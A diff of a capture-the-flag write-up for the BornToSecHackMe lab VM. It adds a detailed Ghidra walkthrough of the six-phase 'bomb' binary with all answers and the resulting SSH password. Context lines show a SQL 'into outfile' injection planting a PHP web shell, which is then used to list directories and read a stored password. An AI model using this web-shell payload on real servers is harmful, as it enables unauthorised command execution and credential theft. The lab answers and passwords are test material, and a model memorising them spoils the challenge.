@@ -18,7 +18,7 @@ Starting Nmap 7.80 ( https://nmap.org ) at 2023-10-30 17:07 CET
 Nmap scan report for 192.168.94.4
 [...]
 
-Nmap scan report for 192.168.94.6
+Nmap scan report for 192.168.94.8
 Host is up (0.0013s latency).
 Not shown: 994 closed ports
 PORT    STATE SERVICE
@@ -42,7 +42,7 @@ We also notice that there are multiple services running:
 
 *Since we don't have any credentials, let's ignore ftp, ssh and imap for now.*
 
-Let's try to access `http://192.168.94.6` in our browser !
+Let's try to access `http://192.168.94.8` in our browser !
 
 ![webpage](imgs/webpage.png)
 
@@ -50,7 +50,7 @@ Nice, a basic website. After a bit of digging there is nothing suspicious within
 
 Let's try to find hidden directories with `dirb``:
 ```
-➜  ~ dirb https://192.168.94.6 -r
+➜  ~ dirb https://192.168.94.8 -r
 
 -----------------
 DIRB v2.22
@@ -58,7 +58,7 @@ By The Dark Raver
 -----------------
 
 START_TIME: Mon Oct 30 19:05:15 2023
-URL_BASE: https://192.168.94.6/
+URL_BASE: https://192.168.94.8/
 WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
 OPTION: Not Recursive
 
@@ -66,12 +66,12 @@ OPTION: Not Recursive
 
 GENERATED WORDS: 4612
 
----- Scanning URL: https://192.168.94.6/ ----
-+ https://192.168.94.6/cgi-bin/ (CODE:403|SIZE:289)
-==> DIRECTORY: https://192.168.94.6/forum/
-==> DIRECTORY: https://192.168.94.6/phpmyadmin/
-+ https://192.168.94.6/server-status (CODE:403|SIZE:294)
-==> DIRECTORY: https://192.168.94.6/webmail/
+---- Scanning URL: https://192.168.94.8/ ----
++ https://192.168.94.8/cgi-bin/ (CODE:403|SIZE:289)
+==> DIRECTORY: https://192.168.94.8/forum/
+==> DIRECTORY: https://192.168.94.8/phpmyadmin/
++ https://192.168.94.8/server-status (CODE:403|SIZE:294)
+==> DIRECTORY: https://192.168.94.8/webmail/
 
 -----------------
 END_TIME: Mon Oct 30 19:05:20 2023
@@ -135,39 +135,39 @@ SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c
 
 How do we know the path of the `templates_c` directory ? Well if we run a scan with dirbuster we can see that there is a `templates_c` directory in the `forum` directory.
 ```
-➜  ~ dirb https://192.168.94.6 | grep -E 'CODE:200|DIRECTORY'
-==> DIRECTORY: https://192.168.94.6/forum/
+➜  ~ dirb https://192.168.94.8 | grep -E 'CODE:200|DIRECTORY'
+==> DIRECTORY: https://192.168.94.8/forum/
 [...]
-==> DIRECTORY: https://192.168.94.6/forum/images/
-==> DIRECTORY: https://192.168.94.6/forum/includes/
-+ https://192.168.94.6/forum/index (CODE:200|SIZE:4935)
-+ https://192.168.94.6/forum/index.php (CODE:200|SIZE:4935)
-==> DIRECTORY: https://192.168.94.6/forum/js/
-==> DIRECTORY: https://192.168.94.6/forum/lang/
-==> DIRECTORY: https://192.168.94.6/forum/modules/
-==> DIRECTORY: https://192.168.94.6/forum/templates_c/
-==> DIRECTORY: https://192.168.94.6/forum/themes/
-==> DIRECTORY: https://192.168.94.6/forum/update/
+==> DIRECTORY: https://192.168.94.8/forum/images/
+==> DIRECTORY: https://192.168.94.8/forum/includes/
++ https://192.168.94.8/forum/index (CODE:200|SIZE:4935)
++ https://192.168.94.8/forum/index.php (CODE:200|SIZE:4935)
+==> DIRECTORY: https://192.168.94.8/forum/js/
+==> DIRECTORY: https://192.168.94.8/forum/lang/
+==> DIRECTORY: https://192.168.94.8/forum/modules/
+==> DIRECTORY: https://192.168.94.8/forum/templates_c/
+==> DIRECTORY: https://192.168.94.8/forum/themes/
+==> DIRECTORY: https://192.168.94.8/forum/update/
 [...]
 ```
 *I've tried every other option and only the `templates_c` directory worked.*
 
-Now we can access the `backdoor.php` file with `https://192.168.94.6/forum/templates_c/backdoor.php` and execute commands with the `cmd` parameter:
+Now we can access the `backdoor.php` file with `https://192.168.94.8/forum/templates_c/backdoor.php` and execute commands with the `cmd` parameter:
 ```
-https://192.168.94.6/forum/templates_c/backdoor.php?cmd=pwd
+https://192.168.94.8/forum/templates_c/backdoor.php?cmd=pwd
 /var/www/forum/templates_c
 
-https://192.168.94.6/forum/templates_c/backdoor.php?cmd=ls%20/
+https://192.168.94.8/forum/templates_c/backdoor.php?cmd=ls%20/
 bin boot cdrom dev etc home initrd.img lib media mnt opt proc rofs root run sbin selinux srv sys tmp usr var vmlinuz
 
 // Yet again after a lot of digging I found this in the home directory
-https://192.168.94.6/forum/templates_c/backdoor.php?cmd=ls%20/home
+https://192.168.94.8/forum/templates_c/backdoor.php?cmd=ls%20/home
 LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz
 
-https://192.168.94.6/forum/templates_c/backdoor.php?cmd=ls%20/home/LOOKATME
+https://192.168.94.8/forum/templates_c/backdoor.php?cmd=ls%20/home/LOOKATME
 password
 
-https://192.168.94.6/forum/templates_c/backdoor.php?cmd=cat%20/home/LOOKATME/password
+https://192.168.94.8/forum/templates_c/backdoor.php?cmd=cat%20/home/LOOKATME/password
 lmezard:G!@M6f4Eatau{sF"
 ```
 
@@ -214,7 +214,7 @@ Let's see the content of the files; first `README`:
 Complete this little challenge and use the result as password for user 'laurie' to login in ssh
 ```
 
-Pretty straightforward. Let's see what's in `fun`
+Pretty straightforward. Let's see what's in `fun`:
 ```
 ➜  ~ cat fun
 [...]
@@ -255,7 +255,7 @@ After looking at their content, we realise that they're just regular text files 
 //file560% // Line number
 ```
 
-I created a [lua script](/scripts/pcap_to_c.lua) to extract the C code from the files and put them in a single file. I also removed the `//file` part for extra clarity.
+I created a [lua script](/scripts/pcap_to_c.lua) to extract the C code from the files and put them in a single file. I also removed the `//file` part for extra clarity. Here is the result:
 ```
 ➜  ft_fun lua pcap_to_c.lua
 Created file:   main.c
@@ -271,25 +271,458 @@ Simple as that. Now let's SHA-256 the password and carry on as instructed in the
 ```
 
 # SSH with user laurie
-ssh -v laurie@192.168.58.5
 
-bomb and README
-nvm im lazy use ghidra
+Alright, let's try to SSH with the new credentials.
+```
+➜  ~ ssh laurie@192.168.94.8
+        ____                _______    _____
+       |  _ \              |__   __|  / ____|
+       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
+       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
+       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
+       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|
 
+                       Good luck & Have fun
+laurie@192.168.94.8's password:
+laurie@BornToSecHackMe:~$
+```
 
-Public speaking is very easy.
+It works as expected. Let's see what's in the home directory.
+```
+laurie@BornToSecHackMe:~$ ls
+bomb  README
+laurie@BornToSecHackMe:~$ cat README
+Diffuse this bomb!
+When you have all the password use it as "thor" user with ssh.
+
+HINT:
+P
+ 2
+ b
+
+o
+4
+
+NO SPACE IN THE PASSWORD (password is case sensitive).
+laurie@BornToSecHackMe:~$
+```
+
+Alright so we have to defuse the bomb by running the `bomb` executable. Let's see what it does:
+```
+laurie@BornToSecHackMe:~$ ./bomb
+Welcome this is my little bomb !!!! You have 6 stages with
+only one life good luck !! Have a nice day!
+test
+
+BOOM!!!
+The bomb has blown up.
+```
+
+It seems like unless I give it the right input, it will blow up. After checking it out with `gdb`, I found the file to be way too long, so I'm going to use `Ghidra` instead.
+
+This is a translated version of the `main` function:
+
+*All the following C code is not supposed to be compiled or  be very accurate, it just gives a general idea of what the program does.*
+```c
+*FILE infile; // Used in read_line
+
+int main(int argc,char **argv)
+{
+  char *buffer;
+  
+  if (argc == 1) {
+    infile = stdin;
+  }
+  else {
+    if (argc != 2) {
+      printf("Usage: %s [<input_file>]\n", argv[0]);
+      exit(8);
+    }
+    infile = fopen(argv[1],"r");
+    if (infile == NULL) {
+      printf("%s: Error: Couldn\'t open %s\n", argv[0], argv[1]);
+      exit(8);
+    }
+  }
+  initialize_bomb();
+  printf("Welcome this is my little bomb !!!! You have 6 stages with\n");
+  printf("only one life good luck !! Have a nice day!\n");
+  buffer = read_line();
+  phase_1(buffer);
+  phase_defused(); // There actually is a secret phase hidden in here, but I didn't bother with it
+  printf("Phase 1 defused. How about the next one?\n");
+  buffer = read_line();
+  phase_2(buffer);
+  phase_defused();
+  printf("That\'s number 2.  Keep going!\n");
+  buffer = read_line();
+  phase_3(buffer);
+  phase_defused();
+  printf("Halfway there!\n");
+  buffer = read_line();
+  phase_4(buffer);
+  phase_defused();
+  printf("So you got that one.  Try this one.\n");
+  buffer = read_line();
+  phase_5(buffer);
+  phase_defused();
+  printf("Good work!  On to the next...\n");
+  buffer = read_line();
+  phase_6(buffer);
+  phase_defused();
+  return 0;
+}
+```
+
+So we have to go through 6 phases, and we only have one try for each of them. Let's see what the first phase does:
+```c
+void phase_1(char *buffer)
+{
+  int i;
+  
+  i = strings_not_equal(buffer,"Public speaking is very easy.");
+  if (i != 0) {
+    explode_bomb();
+  }
+  return;
+}
+```
+
+Pretty simple, we just have to use the string `Public speaking is very easy.` as input. On to phase 2:
+```c
+void phase_2(char *buffer)
+{
+  int i;
+  int tmp[7];
+  
+  read_six_numbers(buffer, tmp + 1); // Put the first 6 numbers of the input in tmp + 1
+  if (tmp[1] != 1) {
+    explode_bomb();
+  }
+  i = 1;
+  do {
+    if (tmp[i + 1] != (i + 1) * tmp[i]) {
+      explode_bomb();
+    }
+    i++;
+  } while (i < 6);
+  return;
+}
+```
+
+The first number we provide has to be equal to 1, futhermore our input needs to have exactly 6 numbers. The next number has to be equal to the index of the loop + 1 multiplied by the previous number. For example:
+
+```
+current_number = 1
+index = 1
+next_number = (index + 1) * current_number = 2
+
+current_number = 2
+index = 2
+next_number = (index + 1) * current_number = 6
+
+[...]
+
+If you've noticed this is the equivalent of applying a factorial on the index we are at.
+```
+
+Using this logic, the final answer is `1 2 6 24 120 720`. On to phase 3:
+```c
+void phase_3(char *buffer)
+{
+  int i;
+  char target;
+  uint first_value;
+  char second_value;
+  int third_value;
+  
+  i = sscanf(buffer,"%d %c %d",&first_value,&second_value,&third_value);
+  if (i < 3) {
+    explode_bomb();
+  }
+  switch(first_value) {
+  case 0:
+    target = 'q';
+    if (third_value != 777) {
+      explode_bomb();
+    }
+    break;
+  case 1:
+    target = 'b';
+    if (third_value != 214) {
+      explode_bomb();
+    }
+    break;
+  case 2:
+    target = 'b';
+    if (third_value != 755) {
+      explode_bomb();
+    }
+    break;
+  case 3:
+    target = 'k';
+    if (third_value != 251) {
+      explode_bomb();
+    }
+    break;
+  case 4:
+    target = 'o';
+    if (third_value != 160) {
+      explode_bomb();
+    }
+    break;
+  case 5:
+    target = 't';
+    if (third_value != 458) {
+      explode_bomb();
+    }
+    break;
+  case 6:
+    target = 'v';
+    if (third_value != 780) {
+      explode_bomb();
+    }
+    break;
+  case 7:
+    target = 'b';
+    if (third_value != 524) {
+      explode_bomb();
+    }
+    break;
+  default:
+    target = 'x';
+    explode_bomb();
+  }
+  if (target != second_value) {
+    explode_bomb();
+  }
+  return;
+}
+```
+
+Again, it's pretty straightforward. Here are all the possible answers:
+```
+0 q 777
+1 b 214
+2 b 755
+3 k 251
+4 o 160
+5 t 458
+6 v 780
+7 b 524
+```
+
+Now let's move on to phase 4:
+```c
+int func4(int first_value)
+{
+  int i;
+  int y;
+  
+  if (first_value < 2) {
+    y = 1;
+  }
+  else {
+    i = func4(first_value + -1);
+    y = func4(first_value + -2);
+    y = y + i;
+  }
+  return y;
+}
+
+void phase_4(char *buffer)
+{
+  int i;
+  int first_value;
+  
+  i = sscanf(buffer,"%d",&first_value);
+  if ((i != 1) || (first_value < 1)) {
+    explode_bomb();
+  }
+  i = func4(first_value);
+  if (i != 55) {
+    explode_bomb();
+  }
+  return;
+}
+```
+
+First of all, we only need to provide one number which needs to be greater than 0. Then the `func4` function is a recursive function that returns the `first_value`'th + 1 number of the Fibonacci sequence; so the answer is `9`. On to phase 5:
+```c
+char array[16] = "isrveawhobpnutfg";
+
+void phase_5(char *buffer)
+{
+  int i;
+  char tmp[6];
+  
+  i = string_length(buffer);
+  if (i != 6) {
+    explode_bomb();
+  }
+  i = 0;
+  do {
+    tmp[i] = array[buffer[i] & 0b00001111];
+    i = i + 1;
+  } while (i < 6);
+  tmp[6] = 0;
+  i = strings_not_equal(tmp,"giants");
+  if (i != 0) {
+    explode_bomb();
+  }
+  return;
+}
+```
+
+We need to provide a string of exactly 6 characters. Then for each character, we take the last 4 bits and use them as an index for the `array` array. To elaborate:
+```
+'g' at index 15, aka binary 1111
+'i' at index 0, aka binary 0000
+'a' at index 5, aka binary 0101
+'n' at index 11, aka binary 1011
+'t' at index 13, aka binary 1101
+'s' at index 1, aka binary 0001
+
+For example let's try with 'a':
+array[a & 0b00001111];
+array[01100001 & 0b00001111];
+array[00000001];
+array[1] = 's';
+
+Here's all the possible answers for each character (ignoring capital letters):
+g: o
+i: p
+a: e, u
+n: k
+t: m
+s: a, q
+
+Therefore our possible answers are:
+opekma, opukma, opekmq, opukmq
+```
+
+Finally, let's move on to phase 6:
+
+*Even though I'm using ghidra, this phase is still very hard to understand. Therefore I'll need to make some assumptions, aswell as slighty modify the structure / logic.*
+```c
+// Assuming node is defined as
+typedef struct Node {
+  int value;
+  struct Node *next;
+} Node;
+
+/*
+As we can see in the main function, we assign node1 to our current node.
+node1 is actually a global variable, it is also the first node of a linked list which is defined as follows:
+node1->next = node2
+node2->next = node3
+node3->next = node4
+node4->next = node5
+node5->next = node6
+node6->next = NULL
+
+Here are the values of each node:
+(gdb) p node1
+$1 = 253
+(gdb) p node2
+$2 = 725
+(gdb) p node3
+$3 = 301
+(gdb) p node4
+$4 = 997
+(gdb) p node5
+$5 = 212
+(gdb) p node6
+$6 = 432
+*/
+
+void phase_6(char *buffer) {
+  Node *current_node;
+  Node *selected_nodes[6];
+  int input_numbers[6];
+  
+  current_node = node1;
+  read_six_numbers(buffer, input_numbers);
+  
+  // Input numbers must be between 1 and 6, and there can't be duplicates. Therefore we're looking for positions.
+  for (int i = 0; i < 6; i++) {
+    if (input_numbers[i] < 1 || input_numbers[i] > 6) {
+      explode_bomb();
+    }
+    for (int j = i + 1; j < 6; j++) {
+      if (input_numbers[i] == input_numbers[j]) {
+        explode_bomb();
+      }
+    }
+  }
+  
+  // Select nodes based on input_numbers aka their positions and put them in selected_nodes
+  for (int i = 0; i < 6; i++) {
+    current_node = node1;
+    for (int j = 1; j < input_numbers[i]; j++) {
+      current_node = current_node->next;
+    }
+    selected_nodes[i] = current_node;
+  }
+  
+  // Properly link the selected nodes
+  for (int i = 0; i < 5; i++) {
+    selected_nodes[i]->next = selected_nodes[i + 1];
+  }
+  selected_nodes[5]->next = NULL;
+  
+  // Check if the list is sorted in descending order
+  current_node = selected_nodes[0];
+  for (int i = 0; i < 5; i++) {
+    if (current_node->value < current_node->next->value) {
+      explode_bomb();
+    }
+    current_node = current_node->next;
+  }
+}
+```
+
+So we need to provide 6 numbers between 1 and 6, without duplicates. Then we need to select the nodes based on their position in the linked list so that their values are in descending order. For example:
+```
+Input: 1 2 3 4 5 6
+Selected nodes: node1 node2 node3 node4 node5 node6
+Linked list: node1->node2->node3->node4->node5->node6->NULL
+Sorted: 253 725 301 997 212 432
+INCORRECT
+
+Input: 4 2 6 3 1 5
+Selected nodes: node4 node2 node6 node3 node1 node5
+Linked list: node4->node2->node6->node3->node1->node5->NULL
+Sorted: 997 725 432 301 253 212
+CORRECT
+```
+
+Alright, we've completed all the phases! Feel free to put them in a single file and run it to see the result:
+```
+laurie@BornToSecHackMe:~$ echo "Public speaking is very easy.
 1 2 6 24 120 720
 0 q 777
 9
 opekmq
-4 2 6 3 1 5
+4 2 6 3 1 5" > plop
+laurie@BornToSecHackMe:~$ ./bomb plop
+Welcome this is my little bomb !!!! You have 6 stages with
+only one life good luck !! Have a nice day!
+Phase 1 defused. How about the next one?
+That's number 2.  Keep going!
+Halfway there!
+So you got that one.  Try this one.
+Good work!  On to the next...
+Congratulations! You've defused the bomb!
+```
 
-Publicspeakingisveryeasy.126241207200q7779opekmq426315 => dont work cause lol project brokey
+Perfect, now we can assemble the password for the `thor` user. According to the `README`, we just need to put all the answers together without spaces.
 
-Publicspeakingisveryeasy.126241207200q7779opekmq426135 => still doesnt work i guess the only phase which can have a different answer is phase 3
 
-use 1 b 214 instead of 0 q 777 (thank u readme)
-Publicspeakingisveryeasy.126241207201b2149opekmq426135
+![bruh](imgs/subject.png)
+
+*Using the hints from the `README` to eliminate some of the possibilities (since we have multiple answers for some stages) and brute forcing the rest, we can find the password: `Publicspeakingisveryeasy.126241207201b2149opekmq426135`*  
+
 
 # User thor
 log into thor and turtle
